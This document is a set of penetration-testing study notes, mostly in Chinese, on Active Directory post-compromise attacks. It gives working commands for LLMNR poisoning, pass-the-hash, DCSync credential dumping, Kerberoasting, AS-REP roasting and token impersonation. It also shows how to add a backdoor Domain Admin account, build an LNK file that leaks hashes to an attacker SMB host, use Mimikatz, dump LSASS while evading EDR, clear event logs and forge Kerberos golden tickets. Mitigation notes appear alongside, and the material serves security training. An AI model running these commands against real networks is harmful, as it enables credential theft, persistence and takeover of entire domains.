# Post-Compromise Attacks
---

## 目錄

1. [LLMNR Poisoning](#1-llmnr-poisoning)
2. [Pass Attacks](#2-pass-attacks)
3. [Dumping and Cracking Hashes](#3-dumping-and-cracking-hashes)
4. [Pass Attack Mitigations](#4-pass-attack-mitigations)
5. [Kerberoasting](#5-kerberoasting)
6. [AS-REP Roasting](#6-as-rep-roasting)
7. [Token Impersonation](#7-token-impersonation)
8. [LNK File Attacks](#8-lnk-file-attacks)
9. [GPP / cPassword Attacks](#9-gpp--cpassword-attacks)
10. [Mimikatz](#10-mimikatz)

---

## 1. LLMNR Poisoning

### 什麼是 LLMNR

**Link-Local Multicast Name Resolution（LLMNR）** 是 Windows 在 DNS 解析失敗時的備援協定，會對區域網路廣播詢問「誰是這個主機名稱？」。

同類協定還有：
- **NBT-NS**（NetBIOS Name Service）
- **mDNS**（Multicast DNS）

### 攻擊原理

```
受害者           攻擊者（Responder）
  │                    │
  │── LLMNR 廣播 ─────►│  （DNS 解析失敗時）
  │                    │  攻擊者回應：「我就是！」
  │◄── 回應 ───────────│
  │                    │
  │── NTLM 認證請求 ───►│  受害者嘗試連線並傳送憑證
  │                    │  攻擊者捕捉 Net-NTLMv2 hash
```

### 工具：Responder

```bash
sudo responder -I eth0 -dwv
```

| 參數 | 說明 |
|------|------|
| `-I eth0` | 指定監聽的網路介面 |
| `-d` | 啟用 DHCP 毒化 |
| `-w` | 啟用 WPAD proxy 攻擊 |
| `-v` | 詳細輸出 |

捕捉到的 hash 格式（Net-NTLMv2）：

```
[SMB] NTLMv2 Hash : Administrator::CORP:1122334455667788:XXXXXXXX...
```

### 破解 Net-NTLMv2 Hash

```bash
hashcat -m 5600 hashes.txt rockyou.txt
```

`-m 5600` 對應 Net-NTLMv2 格式。

### Mitigation

- 停用 LLMNR：`Group Policy → Computer Configuration → Administrative Templates → Network → DNS Client → Turn off Multicast Name Resolution → Enabled`
- 停用 NBT-NS：網路介面卡 → 進階 TCP/IP 設定 → 停用 NetBIOS over TCP/IP
- 啟用網路存取控制（NAC）
- 若無法停用，強制要求 SMB 簽章

---

## 2. Pass Attacks

### 概念

取得 NTLM hash 後，不需破解明文密碼，直接用 hash 進行認證。

- **Pass-the-Hash（PTH）**：使用 NTLM hash 認證
- **Pass-the-Password（PTP）**：使用明文密碼（相同效果，指令不同）

### 工具：crackmapexec

```bash
# Pass-the-Password
crackmapexec smb 192.168.1.0/24 -u Administrator -d CORP -p Password123

# Pass-the-Hash
crackmapexec smb 192.168.1.0/24 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c

# 列出 SMB shares
crackmapexec smb 192.168.1.0/24 -u Administrator -H <hash> --shares

# 執行指令
crackmapexec smb 192.168.1.0/24 -u Administrator -H <hash> -x "whoami"
```

結果標記說明：

| 標記 | 意義 |
|------|------|
| `[+]` | 登入成功 |
| `(Pwn3d!)` | 具有管理員權限 |

### 工具：psexec.py（Impacket）

```bash
# 使用明文密碼
psexec.py CORP/Administrator:Password123@192.168.1.100

# 使用 hash（Pass-the-Hash）
psexec.py Administrator@192.168.1.100 -hashes aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```

### 工具：wmiexec.py / smbexec.py

```bash
wmiexec.py CORP/Administrator:Password123@192.168.1.100
smbexec.py CORP/Administrator:Password123@192.168.1.100
```

---

## 3. Dumping and Cracking Hashes

### 本機 SAM Dump（mimikatz）

```
mimikatz # privilege::debug
mimikatz # lsadump::sam
mimikatz # lsadump::sam /patch
```

### 遠端 DCSync（不需登入 DC）

```bash
# secretsdump.py
secretsdump.py CORP/Administrator:Password123@192.168.1.10

# 使用 hash
secretsdump.py Administrator@192.168.1.10 -hashes <LM>:<NT>
```

### mimikatz DCSync

```
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
mimikatz # lsadump::dcsync /domain:corp.local /all /csv
```

### 破解 NTLM Hash

```bash
hashcat -m 1000 ntlm_hashes.txt rockyou.txt
```

`-m 1000` 對應 NTLM hash 格式。

---

## 4. Pass Attack Mitigations

| 防禦措施 | 說明 |
|---------|------|
| **LAPS** | 每台機器本地 Admin 密碼自動輪換，各機器密碼不同 |
| 停用本地 Administrator 遠端登入 | 防止以本地 Admin hash 橫向移動 |
| 強制 SMB 簽章 | 防止中間人攻擊 |
| 限制 Domain Admin 登入工作站 | 降低 hash 洩漏風險 |
| Privileged Access Workstation (PAW) | 高權限帳號只在特定主機登入 |
| Tiered Administration Model | 區分 Tier 0/1/2，限制帳號使用範圍 |

---

## 5. Kerberoasting

### 攻擊原理

任何 domain 使用者都可以請求有 SPN（Service Principal Name）的服務帳號的 TGS ticket，而 ticket 是用服務帳號的 NTLM hash 加密的，因此可以離線破解。

```
攻擊者（domain user）
  │
  ├── 查詢所有有 SPN 的帳號
  ├── 向 KDC 請求對應的 TGS ticket
  └── 取得加密 ticket → 離線 hashcat 破解
```

### 工具：GetUserSPNs.py（Impacket）

```bash
# 列出所有 SPN 帳號
GetUserSPNs.py CORP/user:password -dc-ip 192.168.1.10

# 取得可破解的 ticket
GetUserSPNs.py CORP/user:password -dc-ip 192.168.1.10 -request

# 輸出到檔案
GetUserSPNs.py CORP/user:password -dc-ip 192.168.1.10 -request -outputfile kerberoast.txt
```

### 破解 TGS Hash

```bash
hashcat -m 13100 kerberoast.txt rockyou.txt
```

`-m 13100` 對應 Kerberos TGS-REP（`$krb5tgs$`）格式。

### Mitigation

- 服務帳號密碼長度 25 字元以上（複雜隨機）
- 使用 **gMSA**（Group Managed Service Account）：自動產生 120 字元隨機密碼
- 定期稽核有 SPN 的帳號
- 監控異常的 TGS 請求量（Event ID 4769）

---

## 6. AS-REP Roasting

### 攻擊原理

停用 Kerberos pre-authentication 的帳號，任何人都可以向 DC 請求 AS-REP，回應中包含用使用者 hash 加密的部分，可離線破解。

### 工具：GetNPUsers.py（Impacket）

```bash
# 有帳號清單
GetNPUsers.py CORP/ -usersfile users.txt -dc-ip 192.168.1.10 -no-pass

# 已知帳號密碼，查找可攻擊的帳號
GetNPUsers.py CORP/user:password -dc-ip 192.168.1.10 -request
```

### 破解

```bash
hashcat -m 18200 asrep_hashes.txt rockyou.txt
```

`-m 18200` 對應 Kerberos AS-REP（`$krb5asrep$`）格式。

### Mitigation

- 不要對任何帳號停用 Kerberos pre-authentication
- 定期稽核 UserAccountControl 屬性中 `DONT_REQ_PREAUTH` 的帳號

---

## 7. Token Impersonation

### 概念

Windows token 是描述 security context 的物件，代表使用者的身份和權限。

Token 類型：

| 類型 | 說明 |
|------|------|
| **Delegate token** | 互動式登入、RDP 登入產生，可跨網路使用 |
| **Impersonate token** | 非互動式（net use、排程工作），只能本機使用 |

### 工具：Metasploit incognito

```bash
# 在 meterpreter session 中
meterpreter > load incognito

# 列出可用 token
meterpreter > list_tokens -u    # 依使用者
meterpreter > list_tokens -g    # 依群組

# 模擬 token
meterpreter > impersonate_token "CORP\\Administrator"

# 還原
meterpreter > rev2self

# 取得 SYSTEM
meterpreter > getsystem
```

### 取得 Domain Admin token 後新增帳號

```bash
meterpreter > shell
net user hacker Password123! /add /domain
net group "Domain Admins" hacker /add /domain
```

### Mitigation

- 限制 SeImpersonatePrivilege、SeAssignPrimaryTokenPrivilege
- 不要以 Domain Admin 身份登入一般工作站
- 使用 PAW 隔離高權限操作

---

## 8. LNK File Attacks

### 攻擊原理

建立惡意 `.lnk` 捷徑檔案，Icon 路徑指向攻擊者的 SMB share，受害者開啟資料夾時（不需點擊）系統自動嘗試載入 icon，觸發 NTLM 認證，Responder 捕捉 Net-NTLMv2 hash。

### 建立惡意 LNK（PowerShell）

```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\share\@file.lnk")
$lnk.TargetPath = "\\<攻擊機IP>\share\file.exe"
$lnk.IconLocation = "\\<攻擊機IP>\share\icon.ico"
$lnk.WindowStyle = 1
$lnk.HotKey = ""
$lnk.Save()
```

檔名加 `@` 讓檔案排序到最前面，增加被看到的機率。

### 配合 Responder 捕捉

```bash
sudo responder -I eth0 -dwv
```

受害者開啟含有該 LNK 的資料夾後，Responder 自動捕捉 hash。

### Mitigation

- 停用 LLMNR / NBT-NS
- 監控 SMB 對外連線
- 限制使用者對共享資料夾的寫入權限

---

## 9. GPP / cPassword Attacks

### 背景

Windows Group Policy Preferences（GPP）允許管理員透過 GPO 設定本地帳號密碼，密碼儲存在 SYSVOL 的 XML 檔案中（`Groups.xml`、`ScheduledTasks.xml` 等），以 AES-256 加密。

但 Microsoft **公開了加密 key**，任何人都可以解密（MS14-025，2014 年修補）。

### XML 中的密碼位置

```xml
<Properties
  action="U"
  cpassword="edBSHOwhZLTjt/QS9FeIcJ8m63By..."
  userName="Administrator"
/>
```

### 解密工具

```bash
# gpp-decrypt（Kali 內建）
gpp-decrypt <cpassword 字串>

# Metasploit（需要已取得 session）
use post/windows/gather/credentials/gpp
run
```

### 手動搜尋 SYSVOL

```bash
# Windows
findstr /S /I cpassword \\<DC>\sysvol\*.xml

# Linux
grep -r "cpassword" /mnt/sysvol/
```

### Mitigation

- 安裝 MS14-025 修補程式（封鎖新建 GPP 密碼）
- 手動刪除 SYSVOL 上殘留的舊 XML 檔案
- 確認 SYSVOL ACL，限制一般使用者讀取

---

## 10. Mimikatz

### 概述

mimikatz 直接讀取 LSASS 記憶體，從各種 SSP（Security Support Provider）取得憑證。

### 前置條件

```
mimikatz # privilege::debug
Privilege '20' OK
```

必須以 **Administrator** 身份執行，SeDebugPrivilege 要成功啟用後才能繼續。

### sekurlsa 模組（LSASS 記憶體）

```
sekurlsa::logonpasswords    # 所有 SSP 憑證（最常用）
sekurlsa::msv               # 只抓 NTLM hash
sekurlsa::wdigest           # WDigest 明文（Win 8.1 以前有效）
sekurlsa::kerberos          # Kerberos 憑證
sekurlsa::tickets           # 記憶體中的 Kerberos ticket
sekurlsa::ekeys             # Kerberos AES key
sekurlsa::dpapi             # DPAPI masterkey
sekurlsa::credman           # Credential Manager
```

### lsadump 模組（LSA / DC）

```
lsadump::sam                              # Dump SAM 本機帳號
lsadump::sam /patch                       # patch 後 dump
lsadump::dcsync /domain:corp.local /all /csv   # DCSync 取得所有 hash
lsadump::dcsync /domain:corp.local /user:krbtgt
lsadump::secrets                          # LSA Secrets
lsadump::cache                            # Cached credentials
```

### kerberos 模組

```
kerberos::list                            # 列出 ticket
kerberos::purge                           # 清除 ticket

# Golden Ticket
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-XXXX /krbtgt:<hash> /ptt

# Silver Ticket
kerberos::silver /user:Administrator /domain:corp.local /sid:S-1-5-21-XXXX /target:server.corp.local /service:cifs /rc4:<hash> /ptt

# Pass-the-Ticket
kerberos::ptt ticket.kirbi
```

### 其他常用指令

```
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<hash>   # Pass-the-Hash
token::elevate                            # 竊取 SYSTEM token
token::list                               # 列出所有 token
event::drop                               # Patch Event Log
event::clear                              # 清除事件日誌
```

### 離線 LSASS Dump（規避 EDR）

```powershell
# comsvcs.dll（Windows 內建）
$id = (Get-Process lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump $id C:\temp\lsass.dmp full

# procdump（Sysinternals）
procdump.exe -ma lsass.exe lsass.dmp
```

帶回攻擊機後離線分析：

```
mimikatz # sekurlsa::minidump C:\temp\lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

### WDigest 明文快取（Win 8.1+）

```powershell
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```

重新登入後 `sekurlsa::wdigest` 即可取得明文。

### Golden Ticket vs Silver Ticket

| 項目 | Golden Ticket | Silver Ticket |
|------|--------------|--------------|
| 偽造對象 | TGT | ST（Service Ticket）|
| 所需 Hash | KRBTGT hash | 服務帳號 hash |
| 存取範圍 | 整個 Domain | 單一服務 |
| 是否經過 DC | 是 | 否（完全繞過）|
| 可偵測性 | 較高 | 更低 |
| 持久性 | 極高 | 中等 |

### 常見錯誤排查

| 錯誤訊息 | 原因 | 解法 |
|---------|------|------|
| `Key import` | offset 不符或 privilege 未啟用 | 先執行 `privilege::debug`，或更新 mimikatz |
| `Handle on memory (0x00000002)` | dump 檔路徑錯誤 | 確認路徑與副檔名（`.dmp` 非 `.dump`）|
| `module not found` | 指令 typo | 重新確認拼字 |
| PPL 保護 | RunAsPPL=1 | 使用 mimidrv.sys kernel driver |

---

## Hashcat 模式速查

| 模式 | Hash 類型 | 攻擊場景 |
|------|----------|---------|
| `-m 1000` | NTLM | SAM dump、secretsdump |
| `-m 5600` | Net-NTLMv2 | Responder、LNK attack |
| `-m 13100` | Kerberos TGS-REP | Kerberoasting |
| `-m 18200` | Kerberos AS-REP | AS-REP Roasting |

---

## 攻擊鏈總覽

```
初始存取
  └── LLMNR Poisoning（Responder）→ Net-NTLMv2 hash → hashcat 破解
  └── 取得一組 domain user 憑證

後滲透
  ├── crackmapexec 橫向移動（Pass-the-Hash / Pass-the-Password）
  ├── secretsdump.py / mimikatz DCSync → 取得更多 hash
  ├── Kerberoasting → 取得服務帳號明文密碼
  ├── AS-REP Roasting → 取得停用 pre-auth 帳號密碼
  ├── Token Impersonation → 竊取 Domain Admin token
  ├── LNK File → 內部釣魚，取得更多 hash
  └── GPP cPassword → 取得 GPO 設定的帳號密碼

目標
  └── Domain Admin → DCSync → 所有帳號 hash → 完整控制
```

---

*參考：Practical Ethical Hacking - TCM Security*